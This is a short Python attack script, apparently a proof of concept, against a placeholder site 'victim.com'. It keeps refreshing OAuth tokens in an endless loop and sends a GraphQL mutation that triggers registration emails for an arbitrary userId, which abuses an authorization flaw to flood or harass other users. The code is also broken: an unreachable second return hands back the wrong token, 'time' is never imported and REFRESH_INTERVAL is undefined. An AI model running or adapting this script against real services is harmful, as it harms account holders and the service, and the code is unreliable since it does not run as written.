import requests
import json
import sys

def send_graphql_request(access_token):
    url = "https://endpoint.victim.com/graphql"
    headers = {
        "Host": "endpoint.victim.com",
        "content-type": "application/json",
    }

    graphql_query = {
        "operationName": "SendRegistrationEmail",
        "variables": {
            "input": {
                "isInCSView": False,  ## from my perspective this is irrelevant, probably has a more important not noticeable use, probably app spesific
                "userId": 480000  ## this is random, and arbitrary, assume any email address or ones that you have registered and know 
            }
        },
        "query": "mutation SendRegistrationEmail($input: SendRegistrationEmailInput) { sendRegistrationEmail(input: $input) { message __typename } }"
    }

    headers["authorization"] = f"Bearer {access_token}"

    response = requests.post(url, headers=headers, json=graphql_query)

    if response.status_code == 200:
        return response.json()
    else:
        print(f"Request failed with status code: {response.status_code}")
        print(response.text)
        return None

def send_refresh_request(refresh_token):
    url = "https://victim.com/oauth/token"
    headers = {
        "Content-Type": "application/json",
        "Host": "victim.com",
    }

    payload = {
        "redirect_uri": "https://victim.com/oauth/callback/",
        "initial_scope": "openid profile email offline_access ID_TYPE:ID_HERE",
        "SessionId": "INSERT_SESSION_ID",
        "identity_sdk_version": "6.40.0",
        "refresh_href": "https://use.victim.com/",
        "client_id": "INSERT_CLIENT_ID",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))

    if response.status_code == 200:
        data = response.json()
        return data.get("refresh_token")
        return data.get("access_token")
    else:
        print(f"Request failed with status code: {response.status_code}")
        print(response.text)
        return None
        


if __name__ == "__main__":
    # Get the initial refresh token from command line arguments or some source
    initial_refresh_token = input("Enter the initial refresh token: ")

    while True:
        new_refresh_token = send_refresh_request(initial_refresh_token)

        if new_refresh_token:
            initial_refresh_token = new_refresh_token

            # Get a new access token using the refreshed token
            access_token = send_refresh_request(initial_refresh_token)
            if access_token:
                # Send the request using the new access token
                send_graphql_request(access_token)
            else:
                print("Failed to get a new access token. Exiting.")
                break

        else:
            print("Failed to refresh the token. Exiting.")
            break

        # Wait for the refresh interval before sending the next request
        time.sleep(REFRESH_INTERVAL)
